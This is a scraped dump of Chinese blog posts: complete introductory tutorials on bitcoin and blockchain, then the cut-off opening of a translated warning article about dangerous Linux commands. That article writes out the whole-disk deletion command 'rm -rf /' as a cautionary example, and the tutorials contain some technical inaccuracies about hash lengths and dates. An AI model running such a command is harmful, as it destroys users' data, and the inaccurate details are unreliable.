class=\"fa fa-link\"></i></a> <a title=\"微博主页\" target=\"_blank\" href=\"http://weibo.com/thoughtworkschina\"><i class=\"fa fa-weibo\"></i></a>         </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "1"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/63509403a5b3f6d5f982aa86a1d386ef.jpg"], "title": "比特币入门教程", "fav_nums": 6, "url": "http://blog.jobbole.com/113429/", "create_date": "2018/01/04", "url_object_id": "8cde19a52cb038302a7b2e77c7e9fc88", "comment_nums": 0, "front_image_path": "full/ddae0a332762a0378654c76a5bf56c4122737863.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.ruanyifeng.com/blog/2018/01/bitcoin-tutorial.html\">阮一峰</a>   </div><div id=\"main-content\"><!-- div class=\"asset-body\" -->比特币（bitcoin）诞生于2008年的一篇<a href=\"https://bitcoin.org/en/bitcoin-paper\">论文</a>。\n<p><!-- /div --> <!-- div id=\"more\" class=\"asset-more\" --></p>\n<p>一个署名为中本聪的人，提出了革命性的构想：让我们创造一种不受政府或其他任何人控制的货币！这个想法堪称疯狂：一串数字，背后没有任何资产支持，也没有任何人负责，你把它当作钱付给对方，怎么会有人愿意接受？</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/63509403a5b3f6d5f982aa86a1d386ef.jpg\" alt=\"\"></p>\n<p>但是，狂想居然变成了现实。随后的几年，在全世界无数爱好者的支持下，比特币网络运行起来了，越来越多的人和资本参与，星星之火，终成燎原。刚刚过去的2017年，比特币迎来了爆发式的增长，从年初的1000美元，最高涨到了2万美元，全世界都为之震动，上到政府，下到普通百姓都在关注。事实就是比特币已经并将继续改变世界。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/27309973c9e7f2fbc7e80eb62494fc77.png\" alt=\"\"></p>\n<p>新闻媒体往往只关注它的火爆表现，忽视或者无法回答一些基本的问题。</p>\n<blockquote>\n<ul>\n<li>比特币的原理是什么？</li>\n<li>为什么这个无人管理的体系可以成功运作？</li>\n<li>比特币交易的流程是怎么回事？</li>\n<li>它与区块链又是什么关系？</li>\n</ul>\n</blockquote>\n<p>下面，我尝试回答这些问题，希望帮助大家理解比特币。抛开技术细节，还是很容易解释的。</p>\n<p>有一点说明，本文只讨论技术问题，不涉及如何投资比特币，更不会预测价格走势。事实上，我也不知道，如果我知道怎么发财，可能就不会在这里写博客了。</p>\n<h2>一、非对称加密</h2>\n<p>首先，理解比特币，必须理解<a href=\"http://www.ruanyifeng.com/blog/2013/06/rsa_algorithm_part_one.html\">非对称加密</a>。</p>\n<p>你可能听说过这个词，所谓非对称加密，其实很简单，就是加密和解密需要两把钥匙：一把公钥和一把私钥。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/f8fb5b5c73dd908f09a6ded5e0308b41.png\" alt=\"\"></p>\n<p>公钥是公开的，任何人都可以获取。私钥是保密的，只有拥有者才能使用。他人使用你的公钥加密信息，然后发送给你，你用私钥解密，取出信息。反过来，你也可以用私钥加密信息，别人用你的公钥解开，从而证明这个信息确实是你发出的，且未被篡改，这叫做数字签名（更详细的介绍请看<a href=\"http://www.ruanyifeng.com/blog/2011/08/what_is_a_digital_signature.html\">《什么是数字签名》</a>）。</p>\n<p>现在请设想，<strong>如果公钥加密的不是普通的信息，而是加密了一笔钱，发送给你，这会怎样？</strong></p>\n<p>首先，你能解开加密包，取出里面的钱，因为私钥在你手里。其次，别人偷不走这笔钱，因为他们没有你的私钥。因此，支付可以成功。</p>\n<p>这就是比特币（以及其他数字货币）的原理：非对称加密保证了支付的可靠性。</p>\n<p>由于支付的钱必须通过私钥取出，所以你是谁并不重要，重要的是谁拥有私钥。只有拥有了私钥，才能取出支付给你的钱。（事实上，真实的交易流程稍有不同，私钥保证的不是取出支付给你的钱，而是保证只有你能把这些属于你的钱支付出去，详见后文。）</p>\n<h2>二、比特币钱包</h2>\n<p>对于比特币来说，钱不是支付给个人的，而是支付给某一把私钥。这就是交易匿名性的根本原因，因为没有人知道，那些私钥背后的主人是谁。</p>\n<p>所以，<strong>比特币交易的第一件事，就是你必须拥有自己的公钥和私钥。</strong></p>\n<p>你去网上那些比特币交易所开户，它们会让你首先生成一个比特币钱包（wallet）。<strong>这个钱包不是用来存放比特币，而是存放你的公钥和私钥。</strong>软件会帮你生成这两把钥匙，然后放在钱包里面。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/4333573063fb5a3756b527b494563f5f.png\" alt=\"\"></p>\n<p>根据协议，公钥的长度是512位。这个长度不太方便传播，因此协议又规定，要为公钥生成一个160位的指纹。所谓指纹，就是一个比较短的、易于传播的哈希值。160位是二进制，写成十六进制，大约是26到35个字符，比如 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2。这个字符串就叫做钱包的地址，它是唯一的，即每个钱包的地址肯定都是不一样的。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/174928d2d1378ea027f6e05859ccf9fd.png\" alt=\"\"></p>\n<p>你向别人收钱时，只要告诉对方你的钱包地址即可，对方向这个地址付款。由于你是这个地址的拥有者，所以你会收到这笔钱。</p>\n<p>由于你是否拥有某个钱包地址，是由私钥证明的（具体的证明方法稍后介绍），所以一定要保护好私钥。这是极其重要的，如果你的私钥被偷了，你的比特币也就等于没了，因为他人可以冒用你的身份了，把钱包里面的钱都转走。</p>\n<p>同样的，你向他人支付比特币，千万不能写错他人的钱包地址，否则你的比特币就支付到了另一个不同的人了。</p>\n<h2>三、交易过程</h2>\n<p>下面，我把整个流程串起来，看看比特币如何完成一笔交易。</p>\n<p><strong>一笔交易就是一个地址的比特币，转移到另一个地址。</strong>由于比特币的交易记录全部都是公开的，哪个地址拥有多少比特币，都是可以查到的。因此，支付方是否拥有足够的比特币，完成这笔交易，这是可以轻易验证的。</p>\n<p>问题出在怎么防止其他人，冒用你的名义申报交易。举例来说，有人申报了一笔交易：地址 A 向地址 B 支付10个比特币。我怎么知道这个申报是真的，申报人就是地址 A 的主人？</p>\n<p>比特币协议规定，申报交易的时候，除了交易金额，转出比特币的一方还必须提供以下数据。</p>\n<blockquote>\n<ul>\n<li>上一笔交易的 Hash（你从哪里得到这些比特币）</li>\n<li>本次交易双方的地址</li>\n<li>支付方的公钥</li>\n<li>支付方的私钥生成的数字签名</li>\n</ul>\n</blockquote>\n<p>验证这笔交易是否属实，需要三步。</p>\n<blockquote><p>第一步，找到上一笔交易，确认支付方的比特币来源。</p>\n<p>第二步，算出支付方公钥的指纹，确认与支付方的地址一致，从而保证公钥属实。</p>\n<p>第三步，使用公钥去解开数字签名，保证私钥属实。</p></blockquote>\n<p>经过上面三步，就可以认定这笔交易是真实的。</p>\n<h2>四、交易确认与区块链</h2>\n<p>确认交易的真实性以后，交易还不算完成。<strong>交易数据必须写入数据库，才算成立，对方才能真正收到钱。</strong></p>\n<p>比特币使用的是一种特殊的数据库，叫做区块链（blockchain），详细的介绍请看<a href=\"http://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html\">《区块链入门教程》</a>。本文只讨论交易如何写入区块链。</p>\n<p>首先，所有的交易数据都会传送到矿工那里。矿工负责把这些交易写入区块链。</p>\n<p>根据比特币协议，一个区块的大小最大是 1MB，而一笔交易大概是500字节左右，因此一个区块最多可以包含2000多笔交易。矿工负责把这2000多笔交易打包在一起，组成一个区块，然后计算这个区块的 Hash。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/d2a41b71d213dcdc3e23259cec5181b0.jpg\" alt=\"\"></p>\n<p>计算 Hash 的过程叫做采矿，这需要大量的计算。矿工之间也在竞争，谁先算出 Hash，谁就能第一个添加新区块进入区块链，从而享受这个区块的全部收益，而其他矿工将一无所获。</p>\n<p>一笔交易一旦写入了区块链，就无法反悔了。这里需要建立一个观念：<strong>比特币不存放在钱包或其他别的地方，而是只存在于区块链上面。</strong>区块链记载了你参与的每一笔交易，你得到过多少比特币，你又支付了多少比特币，因此可以算出来你拥有多少资产。</p>\n<h2>五、矿工的收益</h2>\n<p>交易的确认离不开矿工。为什么有人愿意做矿工呢？</p>\n<p>比特币协议规定，挖到新区块的矿工将获得奖励，一开始（2008年）是50个比特币，然后每4年减半，目前（2018年）是12.5个比特币。这也是比特币的供给增加机制，流通中新增的比特币都是这样诞生的。</p>\n<p>你可能看出来了，每4年奖励减半，那么到了2140年，矿工将得不到任何奖励，比特币的数量也将停止增加。这时，矿工的收益就完全依靠交易手续费了。</p>\n<p>所谓交易手续费，就是矿工可以从每笔交易抽成，具体的金额由支付方自愿决定。你完全可以一毛不拔，一分钱也不给矿工，但是那样的话，你的交易就会没人处理，迟迟无法写入区块链，得到确认。矿工们总是优先处理手续费最高的交易。</p>\n<p>目前由于交易数量猛增，手续费已经水涨船高，一个区块2000多笔交易的手续费总额可以达到3～10个比特币。如果你的手续费给低了，很可能过了一个星期，交易还没确认。</p>\n<p>一个区块的奖励金12.5个比特币，再加上手续费，收益是相当可观的。按照目前的价格，可以达到100万～200万人民币。想想看，运气好的话，几分钟就能挖到一个区块，拿到这样一大笔钱，怪不得人们对挖矿趋之若鹜。</p>\n<h2>六、区块的扩容</h2>\n<p><a href=\"http://blog.jobbole.com/113428/\">《区块链入门教程》</a>说过，比特币协议规定，平均10分钟诞生一个区块。区块的大小只有 1MB，最多只能包含2000多笔交易。也就是说，比特币网络每10分钟，最多只能处理2000多笔交易，换算一下，就是处理速度为3～5笔/秒。</p>\n<p>全世界的比特币交易这么多，可是区块链每秒最多只能处理5笔，这已经成为制约比特币发展的一个瓶颈。</p>\n<p>很早就有人呼吁，改革比特币协议，提升处理速度。这件事在2017年8月有了一点眉目，当时区块链发生了一次分叉，诞生了一个新协议，称为 <a href=\"https://en.wikipedia.org/wiki/Bitcoin_Cash\">Bitcoin Cash</a>（简称 BCH）。这种新货币其他方面都与比特币一致，就是每个区块的大小从 1MB 增加到了 8MB，因此处理速度提升了8倍，手续费也低得多。该协议是对原有区块链的分叉，因此当时持有比特币的人，等于一人获赠了一份同样数量的 BCH。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/39c38fe0e181acf13e1c7aa9a0bbfda7.png\" alt=\"\"></p>\n<p>BCH 等于创造了一种新货币，还有人提议，原始比特币的区块大小提升到 2MB，这称为 <a href=\"https://en.wikipedia.org/wiki/SegWit2x\">SegWit2x</a> 。这个建议原定于2017年11月实施，但是最后一刻由于缺乏共识，就被取消了，目前还在讨论中。</p>\n<h2>七、点对点网络</h2>\n<p>比特币是一个全世界的开放网络，只要你有服务器，就能加入这个网络，成为一个节点。每个节点都包含了整个区块链（目前大概 100多 GB），并且节点之间时刻不停地在同步信息。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/a28ca9a094a80d2ae06a24523b4fc759.png\" alt=\"\"></p>\n<p>当你发生了一笔支付，你所在的节点就会把这笔交易告诉另一个节点，直至传遍整个网络。矿工从网上收集各种新发生的交易，将它们打包写入区块链。一旦写入成功， 矿工所在节点的区块链，就成为最新版本，其他节点都会来复制新增的区块，保证全网的区块链都是一致的。</p>\n<p>最后，你所在的节点也拿到了最新的区块链，从而得知你早先的那笔交易，已经写在里面了，至此交易确认成功。</p>\n<h2>八、还有一个问题</h2>\n<p>写到这里，我就介绍完了比特币的基本知识，希望你已经明白了比特币是怎么回事。但是还有一个根本的问题，我没有回答：比特币的本质到底是什么？</p>\n<p>说到底，比特币只是区块链的一条记录，是凭空生成的，为什么可以当钱用？举例来说，矿工获得12.5个比特币的奖励，其实就是区块链有一个记录：”xxx地址获得12.5个比特币”。正是这行记录，导致该矿工获得了大笔金钱。如果区块链突然增加了一条记录，记载你的地址获得了1000个比特币，你就真的会有1000个比特币。这到底是为什么？</p>\n<p>这篇文章已经够长了，这个问题就留到下次再谈，欢迎关注本系列的最后一篇文章《数字货币的本质》。</p>\n<h2>九、参考链接</h2>\n<ul>\n<li><a href=\"https://arstechnica.com/tech-policy/2017/12/how-bitcoin-works/\">How Bitcoin works</a> , by Timothy B. Lee</li>\n<li><a href=\"http://www.righto.com/2014/02/bitcoins-hard-way-using-raw-bitcoin.html\">Bitcoins the hard way: Using the raw Bitcoin protocol</a>, by Ken Shirriff</li>\n</ul>\n<p>（完）</p>\n<p><!-- /div --></p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113429\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113429votetotal\">3</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113429\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 6 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "3"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/40f9a81cba62930d7bdcff68162b27c0.jpg"], "title": "区块链入门教程", "fav_nums": 7, "url": "http://blog.jobbole.com/113428/", "create_date": "2018/01/04", "url_object_id": "7585aea4a928848a1b6aff7fffcd33d9", "comment_nums": 3, "front_image_path": "full/6f8e539ebd60294ea83d44f2957418887cfa6a70.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.ruanyifeng.com/blog/2017/12/blockchain-tutorial.html\">阮一峰</a>   </div><div id=\"main-content\">\n<p><!-- div class=\"asset-body\" -->区块链（blockchain）是眼下的大热门，新闻媒体大量报道，宣称它将创造未来。</p>\n<p><!-- /div --> <!-- div id=\"more\" class=\"asset-more\" --></p>\n<p>可是，简单易懂的入门文章却很少。区块链到底是什么，有何特别之处，很少有解释。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/40f9a81cba62930d7bdcff68162b27c0.jpg\" alt=\"\"></p>\n<p>下面，我就来尝试，写一篇最好懂的区块链教程。毕竟它也不是很难的东西，核心概念非常简单，几句话就能说清楚。我希望读完本文，你不仅可以理解区块链，还会明白什么是挖矿、为什么挖矿越来越难等问题。</p>\n<p>需要说明的是，我并非这方面的专家。虽然很早就关注，但是仔细地了解区块链，还是从今年初开始。文中的错误和不准确的地方，欢迎大家指正。</p>\n<h2>一、区块链的本质</h2>\n<p>区块链是什么？一句话，它是一种特殊的分布式数据库。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/2e489c6146b763fb4b6e39aed2409203.png\" alt=\"\"></p>\n<p>首先，区块链的主要作用是储存信息。任何需要保存的信息，都可以写入区块链，也可以从里面读取，所以它是数据库。</p>\n<p>其次，任何人都可以架设服务器，加入区块链网络，成为一个节点。区块链的世界里面，没有中心节点，每个节点都是平等的，都保存着整个数据库。你可以向任何一个节点，写入/读取数据，因为所有节点最后都会同步，保证区块链一致。</p>\n<h2>二、区块链的最大特点</h2>\n<p>分布式数据库并非新发明，市场上早有此类产品。但是，区块链有一个革命性特点。</p>\n<p><strong>区块链没有管理员，它是彻底无中心的。</strong>其他的数据库都有管理员，但是区块链没有。如果有人想对区块链添加审核，也实现不了，因为它的设计目标就是防止出现居于中心地位的管理当局。</p>\n<p>正是因为无法管理，区块链才能做到无法被控制。否则一旦大公司大集团控制了管理权，他们就会控制整个平台，其他使用者就都必须听命于他们了。</p>\n<p>但是，没有了管理员，人人都可以往里面写入数据，怎么才能保证数据是可信的呢？被坏人改了怎么办？请接着往下读，这就是区块链奇妙的地方。</p>\n<h2>三、区块</h2>\n<p>区块链由一个个区块（block）组成。区块很像数据库的记录，每次写入数据，就是创建一个区块。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/58c42848736a08f501c8e777ca2500c5.png\" alt=\"\"></p>\n<p>每个区块包含两个部分。</p>\n<blockquote>\n<ul>\n<li>区块头（Head）：记录当前区块的元信息</li>\n<li>区块体（Body）：实际数据</li>\n</ul>\n</blockquote>\n<p>区块头包含了当前区块的多项元信息。</p>\n<blockquote>\n<ul>\n<li>生成时间</li>\n<li>实际数据（即区块体）的 Hash</li>\n<li>上一个区块的 Hash</li>\n<li>…</li>\n</ul>\n</blockquote>\n<p>这里，你需要理解什么叫 <a href=\"https://baike.baidu.com/item/%E5%93%88%E5%B8%8C%E5%80%BC\">Hash</a>，这是理解区块链必需的。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/090eb817d652e840b3ce66ff3476dab5.png\" alt=\"\"></p>\n<p>所谓 Hash 就是计算机可以对任意内容，计算出一个长度相同的特征值。区块链的 Hash 长度是256位，这就是说，不管原始内容是什么，最后都会计算出一个256位的二进制数字。而且可以保证，只要原始内容不同，对应的 Hash 一定是不同的。</p>\n<p>举例来说，字符串<code>123</code>的 Hash 是<code>a8fdc205a9f19cc1c7507a60c4f01b13d11d7fd0</code>（十六进制），转成二进制就是256位，而且只有<code>123</code>能得到这个 Hash。</p>\n<p>因此，就有两个重要的推论。</p>\n<blockquote>\n<ul>\n<li>推论1：每个区块的 Hash 都是不一样的，可以通过 Hash 标识区块。</li>\n<li>推论2：如果区块的内容变了，它的 Hash 一定会改变。</li>\n</ul>\n</blockquote>\n<h2>四、 Hash 的不可修改性</h2>\n<p>区块与 Hash 是一一对应的，每个区块的 Hash 都是针对”区块头”（Head）计算的。</p>\n<blockquote><p>Hash = SHA256(区块头)</p></blockquote>\n<p>上面就是区块 Hash 的计算公式，Hash 由区块头唯一决定，<code>SHA256</code>是区块链的 Hash 算法。</p>\n<p>前面说过，区块头包含很多内容，其中有当前区块体的 Hash（注意是”区块体”的 Hash，而不是整个区块），还有上一个区块的 Hash。这意味着，如果当前区块的内容变了，或者上一个区块的 Hash 变了，一定会引起当前区块的 Hash 改变。</p>\n<p>这一点对区块链有重大意义。如果有人修改了一个区块，该区块的 Hash 就变了。为了让后面的区块还能连到它，该人必须同时修改后面所有的区块，否则被改掉的区块就脱离区块链了。由于后面要提到的原因，Hash 的计算很耗时，同时修改多个区块几乎不可能发生，除非有人掌握了全网51%以上的计算能力。</p>\n<p>正是通过这种联动机制，区块链保证了自身的可靠性，数据一旦写入，就无法被篡改。这就像历史一样，发生了就是发生了，从此再无法改变。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/902f65004f561616ce8f1bc84975df65.png\" alt=\"\"></p>\n<p>每个区块都连着上一个区块，这也是”区块链”这个名字的由来。</p>\n<h2>五、采矿</h2>\n<p>由于必须保证节点之间的同步，所以新区块的添加速度不能太快。试想一下，你刚刚同步了一个区块，准备基于它生成下一个区块，但这时别的节点又有新区块生成，你不得不放弃做了一半的计算，再次去同步。因为每个区块的后面，只能跟着一个区块，你永远只能在最新区块的后面，生成下一个区块。所以，你别无选择，一听到信号，就必须立刻同步。</p>\n<p>所以，区块链的发明者中本聪（这是假名，真实身份至今未知）故意让添加新区块，变得很困难。他的设计是，平均每10分钟，全网才能生成一个新区块，一小时也就六个。</p>\n<p>这种产出速度不是通过命令达成的，而是故意设置了海量的计算。也就是说，只有通过极其大量的计算，才能得到当前区块的有效 Hash，从而把新区块添加到区块链。由于计算量太大，所以快不起来。</p>\n<p>这个过程就叫做采矿（mining），因为计算有效 Hash 的难度，好比在全世界的沙子里面，找到一粒符合条件的沙子。计算 Hash 的机器就叫做矿机，操作矿机的人就叫做矿工。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/ed0a5783ff70c62bdbab1add89a4c479.jpg\" alt=\"\"></p>\n<h2>六、难度系数</h2>\n<p>读到这里，你可能会有一个疑问，人们都说采矿很难，可是采矿不就是用计算机算出一个 Hash 吗，这正是计算机的强项啊，怎么会变得很难，迟迟算不出来呢？</p>\n<p>原来不是任意一个 Hash 都可以，只有满足条件的 Hash 才会被区块链接受。这个条件特别苛刻，使得绝大部分 Hash 都不满足要求，必须重算。</p>\n<p>原来，区块头包含一个<a href=\"http://www.righto.com/2014/02/bitcoin-mining-hard-way-algorithms.html\">难度系数</a>（difficulty），这个值决定了计算 Hash 的难度。举例来说，<a href=\"https://blockexplorer.com/block/000000000003ba27aa200b1cecaad478d2b00432346c3f1f3986da1afd33e506\">第100000个区块</a>的难度系数是 14484.16236122。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/b3851ad9686bdd85d7c5352e206809c6.png\" alt=\"\"></p>\n<p>区块链协议规定，使用一个常量除以难度系数，可以得到目标值（target）。显然，难度系数越大，目标值就越小。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/a847efd8e55e217d2cc3c25740826f4c.png\" alt=\"\"></p>\n<p>Hash 的有效性跟目标值密切相关，只有小于目标值的 Hash 才是有效的，否则 Hash 无效，必须重算。由于目标值非常小，Hash 小于该值的机会极其渺茫，可能计算10亿次，才算中一次。这就是采矿如此之慢的根本原因。</p>\n<p>区块头里面还有一个 Nonce 值，记录了 Hash 重算的次数。第 100000 个区块的 Nonce 值是<code>274148111</code>，即计算了 2.74 亿次，才得到了一个有效的 Hash，该区块才能加入区块链。</p>\n<h2>七、难度系数的动态调节</h2>\n<p>就算采矿很难，但也没法保证，正好十分钟产出一个区块，有时一分钟就算出来了，有时几个小时可能也没结果。总体来看，随着硬件设备的提升，以及矿机的数量增长，计算速度一定会越来越快。</p>\n<p>为了将产出速率恒定在十分钟，中本聪还设计了难度系数的动态调节机制。他规定，难度系数每两周（2016个区块）调整一次。如果这两周里面，区块的平均生成速度是9分钟，就意味着比法定速度快了10%，因此难度系数就要调高10%；如果平均生成速度是11分钟，就意味着比法定速度慢了10%，因此难度系数就要调低10%。</p>\n<p>难度系数越调越高（目标值越来越小），导致了采矿越来越难。</p>\n<h2>八、区块链的分叉</h2>\n<p>即使区块链是可靠的，现在还有一个问题没有解决：如果两个人同时向区块链写入数据，也就是说，同时有两个区块加入，因为它们都连着前一个区块，就形成了分叉。这时应该采纳哪一个区块呢？</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/3ab5f5cc8511aaa711e0349eabfd198d.png\" alt=\"\"></p>\n<p>现在的规则是，新节点总是采用最长的那条区块链。如果区块链有分叉，将看哪个分支在分叉点后面，先达到6个新区块（称为”六次确认”）。按照10分钟一个区块计算，一小时就可以确认。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/e29e5a6fa98d243b940a3adf89d324d0.png\" alt=\"\"></p>\n<p>由于新区块的生成速度由计算能力决定，所以这条规则就是说，拥有大多数计算能力的那条分支，就是正宗的比特链。</p>\n<h2>九、总结</h2>\n<p>区块链作为无人管理的分布式数据库，从2009年开始已经运行了8年，没有出现大的问题。这证明它是可行的。</p>\n<p>但是，为了保证数据的可靠性，区块链也有自己的代价。一是效率，数据写入区块链，最少要等待十分钟，所有节点都同步数据，则需要更多的时间；二是能耗，区块的生成需要矿工进行无数无意义的计算，这是非常耗费能源的。</p>\n<p>因此，区块链的适用场景，其实非常有限。</p>\n<blockquote>\n<ol start=\"1\">\n<li>不存在所有成员都信任的管理当局</li>\n<li>写入的数据不要求实时使用</li>\n<li>挖矿的收益能够弥补本身的成本</li>\n</ol>\n</blockquote>\n<p>如果无法满足上述的条件，那么传统的数据库是更好的解决方案。</p>\n<p><img title=\"\" src=\"http://jbcdn2.b0.upaiyun.com/2018/01/0f7857e7b2a1d2e4ba4799f4a85b6898.png\" alt=\"\"></p>\n<p>目前，区块链最大的应用场景（可能也是唯一的应用场景），就是以比特币为代表的加密货币。下一篇文章，我将会介绍<a href=\"http://blog.jobbole.com/113429/\" target=\"_blank\">比特币的入门知识</a>。</p>\n<h2>十、参考链接</h2>\n<ul>\n<li><a href=\"https://medium.freecodecamp.org/how-does-blockchain-really-work-i-built-an-app-to-show-you-6b70cd4caf7d\">How does blockchain really work?</a>, by Sean Han</li>\n<li><a href=\"http://www.righto.com/2014/02/bitcoin-mining-hard-way-algorithms.html\">Bitcoin mining the hard way: the algorithms, protocols, and bytes</a>, by Ken Shirriff</li>\n</ul>\n<p>（完）</p>\n<p><!-- /div --></p>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113428\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113428votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113428\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 7 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 3 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "praise_numbers": "2"}
{"tags": "IT技术", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/98f8ce146e703f781626982be880cdf5.jpeg"], "title": "绝不要用的 Linux 命令 ！", "fav_nums": 5, "url": "http://blog.jobbole.com/113437/", "create_date": "2018/01/07", "url_object_id": "e3a2ad757e369fe8e6d1f11af56e0091", "comment_nums": 4, "front_image_path": "full/eddbdfa6ee3b7f537ff14b7a523f5b3bffa5d38d.jpg", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.hpe.com/us/en/insights/articles/the-linux-commands-you-should-never-use-1712.html\">Steven Vaughan-nichols</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9206-1.html\"> ChenYi</a>   </div><p><strong>当然，除非你想干掉你的机器。</strong></p>\n<div id=\"article_content\">\n<p>蜘蛛侠有这样的一句信条，“权力越大，责任越大。” 对于 Linux 系统管理员们来说，这也是一种应当采用的明智态度。</p>\n<p>不，真的，真心感谢 DevOps 的沟通协作和云编排技术，让一个 Linux 管理员不仅能掌控一台服务器，甚者能控制成千上万台服务器实例。只需要一个愚蠢的举动，你甚至可以毁掉一个价值数十亿美元的企业，就像 <a href=\"http://www.zdnet.com/article/equifax-blames-open-source-software-for-its-record-breaking-security-breach/\">没有打补丁的 Apache Struts</a> 一样。</p>\n<p>如果不能跑在安全补丁之前，这将会带来一个远超过系统管理员工资水平的战略性业务问题。这里就有一些足以搞死 Linux 服务器的简单方式掌握在系统管理员手中。很容易想象到，只有新手才会犯这些错误，但是，我们需要了解的更多。</p>\n<p>下列是一些著名的命令，任何拥有 root 权限的用户都能借助它们对服务器造成严重破坏。</p>\n<p><strong>警告：千万不要在生产环境运行这些命令，它们会危害你的系统。不要在家里尝试，也不要在办公室里测试。</strong></p>\n<p>那么，继续！</p>\n<h1 id=\"toc_1\">rm -rf /</h1>\n<p>想要干脆利落的毁掉一个 Linux 系统吗？你无法超越这个被誉为“史上最糟糕”的经典，它能删除一切，我说的是，能删除所有存在你系统里的内容！</p>\n<p>和大多数 <a href=\"https://www.hpe.com/us/en/insights/articles/16-linux-server-monitoring-commands-you-really-need-to-know-1703.html\">Linux 命令</a>一样，<strong>rm</strong> 这个核心命令使用起来非常方便。即便是最顽固的文件它也能帮你删除。结合起后面两个参数理解 <strong>rm</strong> 指令时，你很容易陷入大麻烦：<strong>-r</strong>，强制递归删除所有子目录，<strong>-f</strong>，无需确认，强制删除所有只读文件。如果你在根目录运行这条指令，将清除整个驱动器上的所有数据。</p>\n<p>如果你真这么干了，想想该怎么和老板解释吧！</p>\n<p>现在，也许你会想，“我永远不会犯这么愚蠢的错误。”朋友，骄兵必败。吸取一下经验教训吧， <a href=\"https://www.reddit.com/r/sysadmin/comments/732skq/after_21_years_i_finally_made_the_rm_boo_boo/\">这个警示故事来自于一个系统管理员在 Reddit 上的帖子</a>：</p>\n<blockquote><p>我在 IT 